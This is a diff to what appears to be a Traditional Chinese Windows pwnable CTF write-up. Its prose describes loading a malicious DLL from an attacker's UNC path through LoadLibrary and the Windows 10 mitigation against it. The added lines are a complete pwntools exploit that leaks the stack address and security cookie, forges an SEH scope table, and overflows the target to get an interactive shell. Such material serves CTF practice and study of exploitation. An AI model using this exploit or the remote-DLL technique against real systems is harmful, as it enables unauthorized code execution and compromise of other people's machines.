@@ -106,3 +106,59 @@ int main() {
 由於一般的windows Pwnable沒有辦法直接執行system彈shell，因此需要使用各種各樣的shellcode來完成想要的操作，但是這樣做相當麻煩，在測試shellcode的時候可能發生本地與遠端環境不同等情況，如果能呼叫LoadLibrary，工作量就能大大減輕。    
 LoadLibrary是windows下用來下載DLL的function，由於其支持UNC Path，因此可以呼叫**LoadLibrary("\\attacker_ip\malicious.dll")**，讓程式下載遠端伺服器上攻擊者提供的DLL，從而達到執行任意程式執行。這樣的攻擊方式比執行shellcode更穩定。    
 因此，win10中引入了**Disable Remote Image Loading**機制，若程式執行時開啟此項緩解措施，則無法使用UNC PATH下載遠端DLL。
+
+
+exploit:
+```py
+from pwn import *
+
+# context.log_level = 'debug'
+context.arch = 'i386'
+
+sh = remote('192.168.3.129', 1001)
+
+def get_value(addr):
+    sh.recvuntil('Do you want to know more?')
+    sh.sendline('yes')
+    sh.recvuntil('Where do you want to know')
+    sh.sendline(str(addr))
+    sh.recvuntil('value is ')
+    return int(sh.recvline(), 16)
+
+sh.recvuntil('stack address =')
+result = sh.recvline()
+stack_addr = int(result, 16)
+log.success('stack_addr: ' + hex(stack_addr))
+sh.recvuntil('main address =')
+result = sh.recvline()
+main_address = int(result, 16)
+log.success('main_address: ' + hex(main_address))
+
+security_cookie = get_value(main_address + 12116)
+log.success('security_cookie: ' + hex(security_cookie))
+
+# pause()
+sh.sendline('n')
+next_addr = stack_addr + 212
+log.success('next_addr: ' + hex(next_addr))
+
+SCOPETABLE = [
+    0x0FFFFFFFE,
+    0,
+    0x0FFFFFFCC,
+    0,
+    0xFFFFFFFE,
+    main_address + 733,
+]
+
+payload = 'a' * 16 + flat(SCOPETABLE).ljust(104 - 16, 'a') + p32((stack_addr + 156) ^ security_cookie) + 'c' * 32 + p32(next_addr) + p32(main_address + 944) + p32((stack_addr + 16) ^ security_cookie) + p32(0) + 'b' * 16
+sh.sendline(payload)
+
+sh.recvline()
+sh.sendline('yes')
+sh.recvuntil('Where do you want to know')
+sh.sendline('0')
+
+sh.interactive()
+
+```
